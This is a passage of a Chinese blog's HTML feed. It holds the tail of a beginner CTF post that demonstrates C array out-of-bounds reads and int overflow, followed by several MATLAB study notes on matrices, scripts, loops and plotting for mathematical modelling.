number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>​    运行结果：</p><p><img src="https://i.loli.net/2018/10/14/5bc299e356904.png" alt=""></p><p>​    因为a[4]并不在我们定义的数组范围，属于数组越界，接下来调试一下看看具体情况：</p><p><img src="https://i.loli.net/2018/10/14/5bc2998608bee.png" alt=""></p><p>​    而就在0，1，2，3后面是不是我们运行输出的那个值呢？正是如此，因为我们通过a[4]访问的并不是我们曾经定义过的元素，而是程序运行中的产生的随机值，如函数地址等。</p></blockquote><h2 id="验证int溢出"><a href="#验证int溢出" class="headerlink" title="验证int溢出"></a>验证int溢出</h2><blockquote><p>​    在64位系统中 <code>int</code>型变量是占用4个字节大小的，而4个字节用16进制表示就是<code>0x00000000-0xffffffff</code>，并且正数负数都在其中，而负数是用补码表示的，<code>0x7fffffff&lt;=&gt;2147483647</code>，<code>0x80000000=2147483648&lt;=&gt;-2147483648</code>。</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"四个字节最大值0x7fffffff十进制为:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token number">0x7fffffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入你想要赋给int的值:\n"</span><span class="token punctuation">)</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>运行结果：</p><p><img src="https://i.loli.net/2018/10/14/5bc29c77aa16d.png" alt=""></p><p>​    果不其然，我们赋给int的2147483648变成了负数，-2147483648。</p><p><img src="https://i.loli.net/2018/10/14/5bc29d54a35a3.png" alt=""></p></blockquote><blockquote><p>have a good weekend everybody!</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> CTF </tag>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数学建模-day5</title>
      <link href="/2018/10/13/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day5/"/>
      <url>/2018/10/13/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day5/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="数学建模-day5-线性代数"><a href="#数学建模-day5-线性代数" class="headerlink" title="数学建模_day5 - 线性代数"></a>数学建模_day5 - 线性代数</h1><blockquote><p>​    线性代数相信大家都学过哒，基本是大学的理科必修课，而线性代数常用于工程数学，自然而然就和数学建模有很大的关系啦，今天学习一下用matlab做一些相关的线性代数学习。</p></blockquote><h2 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h2><blockquote><p>​    MATLAB 提供了许多函数，用于创建各种类型的矩阵。例如，你就可以使用基于帕斯卡三角形的项创建一个对称矩阵： </p></blockquote><pre class=" language-matlab"><code class="language-matlab">A <span class="token operator">=</span> <span class="token function">pascal</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#虚线下为运行结果A <span class="token operator">=</span>       <span class="token number">1</span>     <span class="token number">1</span>     <span class="token number">1</span>       <span class="token number">1</span>     <span class="token number">2</span>     <span class="token number">3</span>       <span class="token number">1</span>     <span class="token number">3</span>     <span class="token number">6</span></code></pre><blockquote><p>我们也可以创建一个非对称<em>幻方矩阵</em>，它的行总和与列总和相等： </p></blockquote><pre class=" language-matlab"><code class="language-matlab">B <span class="token operator">=</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#虚线下为运行结果B <span class="token operator">=</span>       <span class="token number">8</span>     <span class="token number">1</span>     <span class="token number">6</span>       <span class="token number">3</span>     <span class="token number">5</span>     <span class="token number">7</span>       <span class="token number">4</span>     <span class="token number">9</span>     <span class="token number">2</span></code></pre><blockquote><p>​    这里我们学习一下<code>randi()</code>函数，randi的第一个参数可以用于描述产生矩阵的数值范围，后面的两个参数是行列数，例如：</p></blockquote><pre class=" language-matlab"><code class="language-matlab">a <span class="token operator">=</span> <span class="token function">randi</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#虚线下为运行结果a <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">13</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">9</span>    <span class="token number">19</span>     <span class="token number">2</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">19</span>     <span class="token number">3</span>     <span class="token number">6</span>     <span class="token number">4</span>    <span class="token number">17</span>    <span class="token number">16</span>    <span class="token number">19</span>    <span class="token number">11</span>    <span class="token number">20</span>     <span class="token number">3</span>    <span class="token number">20</span></code></pre><h2 id="矩阵的转置"><a href="#矩阵的转置" class="headerlink" title="矩阵的转置"></a>矩阵的转置</h2><blockquote><p>​    我们知道矩阵有实数矩阵和复数矩阵两种，对于实矩阵，<em>转置</em>运算对 aij 和 aji 进行交换。对于复矩阵，还要考虑是否用数组中复数项的复共轭来形成<em>复共轭转置</em>。MATLAB 使用撇号运算符 (<code>&#39;</code>) 执行复共轭转置，使用点撇号运算符 (<code>.&#39;</code>) 执行无共轭的转置。对于包含所有实数元素的矩阵，这两个运算符返回相同结果。 </p><p>实矩阵转置示例：</p></blockquote><pre class=" language-matlab"><code class="language-matlab">#这里拿上一步的a值做测试a<span class="token operator">'</span>ans <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">19</span>     <span class="token number">3</span>    <span class="token number">19</span>    <span class="token number">13</span>     <span class="token number">2</span>     <span class="token number">6</span>    <span class="token number">11</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">4</span>    <span class="token number">20</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">17</span>     <span class="token number">3</span>     <span class="token number">9</span>    <span class="token number">19</span>    <span class="token number">16</span>    <span class="token number">20</span>#事实证明实矩阵 a<span class="token operator">'</span>和a<span class="token operator">.'</span>操作是一样的结果     a<span class="token operator">.'</span>ans <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">19</span>     <span class="token number">3</span>    <span class="token number">19</span>    <span class="token number">13</span>     <span class="token number">2</span>     <span class="token number">6</span>    <span class="token number">11</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">4</span>    <span class="token number">20</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">17</span>     <span class="token number">3</span>     <span class="token number">9</span>    <span class="token number">19</span>    <span class="token number">16</span>    <span class="token number">20</span></code></pre><blockquote><p>定义复数矩阵并进行转置:</p></blockquote><pre class=" language-matlab"><code class="language-matlab">z <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2i</span> <span class="token number">3</span><span class="token operator">+</span><span class="token number">2i</span> <span class="token number">5</span><span class="token operator">+</span><span class="token number">i</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">i</span> <span class="token number">9</span><span class="token operator">+</span><span class="token number">i</span> <span class="token number">4</span><span class="token operator">+</span><span class="token number">5i</span><span class="token punctuation">]</span>z <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">+</span> <span class="token number">5.0000i</span>#z 的共轭转置为：z<span class="token operator">'</span>ans <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">-</span> <span class="token number">2.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">-</span> <span class="token number">2.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">-</span> <span class="token number">5.0000i</span>#z 的非共轭转置z<span class="token operator">.'</span>ans <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">+</span> <span class="token number">5.0000i</span></code></pre><h2 id="矩阵的乘积"><a href="#矩阵的乘积" class="headerlink" title="矩阵的乘积"></a>矩阵的乘积</h2><blockquote><p>​    之前学习线性代数的时候，计算矩阵的乘积都是按公式来算，现在可以通过matlab for循环来实现这个计算：</p></blockquote><pre class=" language-matlab"><code class="language-matlab">A <span class="token operator">=</span> <span class="token function">pascal</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>B <span class="token operator">=</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> n <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>m     <span class="token keyword">for</span> <span class="token number">j</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>n        <span class="token function">C</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">B</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">end</span><span class="token keyword">end</span></code></pre><blockquote><p>​    按矩阵乘法规则，矩阵可以在其右侧乘以列向量，在左侧乘以行向量。</p></blockquote><blockquote><p>​    接下来结合具体数学实例，来进行更深入的综合性学习。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数学建模-day4</title>
      <link href="/2018/10/09/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day4/"/>
      <url>/2018/10/09/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day4/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="数学建模-day4-matlab编程和脚本"><a href="#数学建模-day4-matlab编程和脚本" class="headerlink" title="数学建模_day4 - matlab编程和脚本"></a>数学建模_day4 - matlab编程和脚本</h1><h2 id="创建与运行脚本"><a href="#创建与运行脚本" class="headerlink" title="创建与运行脚本"></a>创建与运行脚本</h2><blockquote><p>​    <em>脚本</em>是最简单的一种 MATLAB® 程序。脚本是一个包含多行连续 MATLAB 命令和函数调用的扩展名为 <code>.m</code> 的文件。在命令行中键入脚本名称即可运行该脚本。 </p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 要创建脚本，可以使用 <code>edit &quot;filename&quot;</code></p><pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">% 这会打开一个名为 "filename".m 的空白文件。输入一些绘制随机数据的向量的代码：</span>n <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>r <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">plot</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment" spellcheck="true">% mean 函数求均值，对生成的50个值求平均</span><span class="token comment" spellcheck="true">% mean(r,1)表示对每列求平均</span><span class="token comment" spellcheck="true">% mean(r,2)表示对每行求平均</span><span class="token comment" spellcheck="true">% Draw a line from (0,m) to (n,m)</span>m <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">% hold on 是当前轴及图像保持而不被刷新，准备接受此后将绘制的图形，多图共存</span>hold on<span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>m<span class="token punctuation">,</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">% hold off 是当前轴及图像不再具备被刷新的性质，新图出现时，取消原图。即，关闭图形保持功能</span>hold off<span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Mean of Random Uniform Data'</span><span class="token punctuation">)</span></code></pre><blockquote><p>成品图如下：</p></blockquote><div align="center"><br><br><img src="https://i.loli.net/2018/10/10/5bbdfdf74ac32.png" alt=""><br><br></div><blockquote><p>保存文件后可以通过右键运行，也可直接输入文件名运行。</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe0157d413b.png" alt=""><br><br></div><h2 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h2><blockquote><p>通过一段代码来直接看看matlab的for循环有什么不一样：</p></blockquote><pre class=" language-matlab"><code class="language-matlab">nsamples <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>npoints <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">% matlab 的 for循环是 for i=n:m 的形式，范围为n到m，需要用end关键词表示结束</span><span class="token keyword">for</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>nsamples   iterationString <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Iteration #'</span><span class="token punctuation">,</span><span class="token function">int2str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">%disp类似printf 用于打印语句</span>   <span class="token function">disp</span><span class="token punctuation">(</span>iterationString<span class="token punctuation">)</span>   currentData <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span>npoints<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">sampleMean</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>currentData<span class="token punctuation">)</span><span class="token keyword">end</span>overallMean <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>sampleMean<span class="token punctuation">)</span></code></pre><blockquote><p>效果图如下：</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe048ca9c1b.png" alt=""></div><blockquote><p>需要注意的是：脚本位置</p><blockquote><p>MATLAB 在特定位置中查找脚本及其他文件。要运行脚本，该文件必须位于当前文件夹或<em>搜索路径</em>中的某个文件夹内。</p><p>默认情况下，MATLAB 安装程序创建的 <code>MATLAB</code> 文件夹位于此搜索路径中。如果要将程序存储在其他文件夹，或者要运行其他文件夹中的程序，请将其添加到此搜索路径。在当前文件夹浏览器中选中相应的文件夹，右键点击，然后选择<strong>添加到路径</strong>。</p></blockquote></blockquote><h2 id="用函数生成矩阵"><a href="#用函数生成矩阵" class="headerlink" title="用函数生成矩阵"></a>用函数生成矩阵</h2><table><thead><tr><th style="text-align:left">函数</th><th>特征</th></tr></thead><tbody><tr><td style="text-align:left">ones</td><td>全部为1</td></tr><tr><td style="text-align:left">rand</td><td>均匀分布的随机元素</td></tr><tr><td style="text-align:left">randn</td><td>正态分布的随机元素</td></tr><tr><td style="text-align:left">zeros</td><td>全部为0</td></tr><tr><td style="text-align:left">magic</td><td>创建几乎任意大小的幻方矩阵</td></tr></tbody></table><h2 id="查看帮助"><a href="#查看帮助" class="headerlink" title="查看帮助"></a>查看帮助</h2><blockquote><p>所有 MATLAB函数都有辅助文档，这些文档包含一些示例，并介绍函数输入、输出和调用语法。从命令行访问此信息有多种方法，如下图：</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe0593a6722.png" alt=""></div><blockquote><p>今日到此。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数学建模-day3</title>
      <link href="/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day3/"/>
      <url>/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day3/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="数学建模-day3-matlab-基本用法"><a href="#数学建模-day3-matlab-基本用法" class="headerlink" title="数学建模_day3 - matlab 基本用法"></a>数学建模_day3 - matlab 基本用法</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; day3 继续 day2的 matlab 基本用法学习，今天学习数学模型绘图，matlab的绘图功能十分强大，各种功能如下图。</p><p><img src="https://i.loli.net/2018/10/08/5bbaf8f1ec8e8.png" alt=""></p><h2 id="六-根据条件构建二维图和三维图像"><a href="#六-根据条件构建二维图和三维图像" class="headerlink" title="六. 根据条件构建二维图和三维图像"></a>六. 根据条件构建二维图和三维图像</h2><h3 id="plot-函数-–-二维"><a href="#plot-函数-–-二维" class="headerlink" title="plot 函数 – 二维"></a>plot 函数 – 二维</h3><p> &nbsp; &nbsp; &nbsp; 创建二维线图首先需要构建一个二维的函数，比如常见的 y = sin(x)，y = 2*x，y = 2^x。</p><p> &nbsp; &nbsp; &nbsp; 可以通过以下代码定义y = sin(x)函数:</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">100</span><span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">100</span><span class="token punctuation">;</span>     <span class="token operator">/</span><span class="token operator">/</span>创建一个<span class="token operator">-</span><span class="token number">100</span>到<span class="token number">100</span>步长为<span class="token number">10</span>的一维数组用来作为Xy <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">/</span><span class="token operator">/</span>构成函数 y <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbae75ed9328.png" alt=""></div><p> &nbsp; &nbsp; &nbsp; 因为步长的关系造成了这张图片的狰狞，不过没关系，我们可以改一下x的范围：</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token number">0</span><span class="token operator">:</span><span class="token keyword">pi</span><span class="token operator">/</span><span class="token number">100</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span>改成单位圆范围y <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span></code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbae85f7aa9f.png" alt=""><br><br></div><h3 id="surf-和-mesh-函数-–-三维"><a href="#surf-和-mesh-函数-–-三维" class="headerlink" title="surf 和 mesh 函数 – 三维"></a>surf 和 mesh 函数 – 三维</h3><p> &nbsp; &nbsp; &nbsp; 三维图通常显示一个由带两个变量的函数（即 <em>z = f (x,y</em>)）定义的曲面图。 surf 函数及其伴随函数 mesh 以三维形式显示曲面图。surf 使用颜色显示曲面图的连接线和面。mesh 生成仅以颜色标记连接定义点的线条的线框曲面图。</p><p> &nbsp; &nbsp; &nbsp; 例如在三维坐标系中，构建一个 Z=1，-1&lt;x&lt;1，-1&lt;y&lt;1，的平面，我们要输入以下代码：</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>y <span class="token operator">=</span> x<span class="token punctuation">;</span>z <span class="token operator">=</span> <span class="token function">ones</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mesh</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbaf6e837e65.png" alt=""></div><p> &nbsp; &nbsp; &nbsp; exp函数，例如exp(5)代表的是e^5。要计算 <em>z</em>，请首先使用 <code>meshgrid</code> 在将要创建的三维函数的域中创建一组 (<em>x,y</em>) 点。 ：</p><pre class=" language-matlab"><code class="language-matlab"><span class="token punctuation">[</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">meshgrid</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span>创建<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>点Z <span class="token operator">=</span> X <span class="token operator">.*</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>X<span class="token operator">.^</span><span class="token number">2</span> <span class="token operator">-</span> Y<span class="token operator">.^</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span>得到Z<span class="token function">surf</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span>；                <span class="token operator">/</span><span class="token operator">/</span>画图</code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbaf9b2535a5.png" alt=""></div><h3 id="cylinder-和-subplot-函数"><a href="#cylinder-和-subplot-函数" class="headerlink" title="cylinder 和 subplot 函数"></a>cylinder 和 subplot 函数</h3><p> &nbsp; &nbsp; &nbsp; cylinder通常用于生成圆柱模型并返回x，y，z坐标值，subplot通常用于分割窗口用以显示不同的图形。</p><pre class=" language-matlab"><code class="language-matlab">Matlab cylinder 函数：　　<span class="token number">1</span>、cylinder函数功能说明：绘制三维圆柱图。　　<span class="token number">2</span>、cylinder函数用法说明：　　（<span class="token number">1</span>）<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span>cylinder 函数返回一半径和高度都为<span class="token number">1</span>的圆柱体x，y，z轴的坐标值，圆柱体沿其周长有<span class="token number">20</span>个等距分布的点；　　（<span class="token number">2</span>）<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">cylinder</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> 函数一个半径为r、高度为<span class="token number">1</span>的圆柱体的x，y，z轴的坐标值，圆柱体沿其周长有<span class="token number">20</span>个等距分布的点；　　（<span class="token number">3</span>）<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">cylinder</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>n<span class="token punctuation">)</span> 函数一个半径为r、高度为<span class="token number">1</span>的圆柱体的x，y，z轴的坐标值，圆柱体沿其周长有n个等距分布的点；　　（<span class="token number">4</span>）<span class="token function">cylinder</span><span class="token punctuation">(</span><span class="token punctuation">...</span><span class="token punctuation">)</span> 函数只绘制圆柱，没有任何的输出参量。其他参量及结果同上。</code></pre><p> &nbsp; &nbsp; &nbsp; 用一个例子来展示一下cylinder和subplot的用法：</p><pre class=" language-matlab"><code class="language-matlab">t <span class="token operator">=</span> <span class="token number">0</span><span class="token operator">:</span><span class="token keyword">pi</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">;</span><span class="token punctuation">[</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cylinder</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">surf</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token 